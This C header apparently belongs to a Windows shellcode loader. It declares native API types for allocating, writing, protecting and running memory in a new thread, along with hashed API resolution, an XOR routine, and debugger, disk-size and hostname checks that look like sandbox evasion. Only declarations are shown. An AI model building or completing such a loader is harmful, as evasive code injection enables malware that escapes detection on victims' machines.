#ifndef CONFIG_H
#define CONFIG_H

#include <windows.h>
#include <stdio.h>
#include <stdint.h>


typedef enum { false, true } bool;

typedef struct {
    unsigned int value;
    uint8_t rotation_value;
    bool is_rotation_right;
} FctHash;

typedef NTSTATUS (NTAPI* NtAllocVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS(NTAPI* NtWriteVirtMem)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
);

typedef NTSTATUS(NTAPI* NtProtectVirtMem)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS(NTAPI* NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PCRYPT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS(NTAPI* NtWaitForSingleObj)(
    HANDLE Handle,
    BOOLEAN Alertable,
    PLARGE_INTEGER Timeout
);

typedef BOOL(WINAPI* GetComputerNameFunc)(
    LPSTR lpBuffer,
    LPDWORD lpnSize
);

typedef BOOL(WINAPI *GetDiskFreeSpaceExFuncA)(
    LPCSTR,
    PULARGE_INTEGER,
    PULARGE_INTEGER,
    PULARGE_INTEGER
);

extern FctHash NTDLL_HASH;
extern FctHash KERNEL32_HASH;

extern FctHash QUERY_INFORMATION_PROCESS_HASH;
extern FctHash GET_COMPUTER_NAME_HASH;
extern FctHash GET_DISK_FREE_SPACE_HASH;
extern FctHash LOAD_LIBRARY_HASH;

extern FctHash VIRTUAL_ALLOC_HASH;
extern FctHash WRITE_MEMORY_HASH;
extern FctHash VIRTUAL_PROTECT_HASH;
extern FctHash CREATE_THREAD_HASH;
extern FctHash WAIT_FOR_SINGLE_OBJECT_HASH;

extern const char* HOSTNAME_PREFIX;


void XOR(unsigned char *data, size_t len, uint16_t key);

HMODULE CustomGetModuleHandle(FctHash module_hash);
FARPROC CustomGetProcAdress(IN HMODULE hModule, FctHash function_hash);

uint8_t is_being_debugged();
int get_disk_size(HMODULE hKernel32dll);
const char* get_hostname(HMODULE hKernel32dll);
int starts_with(const char* str, const char* prefix);

void clean_exit(FILE* file);
int divide(int a, int b);
int multiply(int a, int b);
int add(int a, int b);
int substract(int a, int b);

#endif // CONFIG_H
